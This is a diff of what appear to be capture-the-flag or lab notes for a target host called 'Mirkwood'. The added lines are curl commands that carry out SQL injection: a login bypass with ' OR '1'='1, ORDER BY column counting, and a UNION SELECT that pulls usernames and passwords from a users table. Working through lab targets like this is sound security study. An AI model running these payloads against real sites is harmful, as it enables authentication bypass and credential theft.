@@ -69,7 +69,17 @@ Notes: Mirkwood, possible SQL injection?
 
 SQLite3
 
-works mostly: curl -L -i -X POST -H "Content-Type: multipart/form-data" -F "username=a" -F "password=pass' OR '1'='1"  http://10.89.1.6/authenticate.php
+show where redirected + sql inject:
+curl -sLD - -X POST -H "Content-Type: multipart/form-data" -F "username=\x27" -F "password=pass' OR '1'='1"  http://10.89.1.6/authenticate.php -o /dev/null -w '%{url_effective}' 
+
+page:
+curl -i http://10.89.1.6/list.php?id=2
+
+how many selected columns
+curl -iv http://10.89.1.6/list.php?id=5%20ORDER%20BY%203-- (id=2 ORDER BY 3--)
+
+sql inject:
+curl -iv http://10.89.1.6/list.php?id=2%20UNION%20SELECT%20username%2Cpassword%2CNULL%20from%20users-- (id=2 UNION SELECT username,password,NULL from users--)
 
 
 ********** HINT E **********
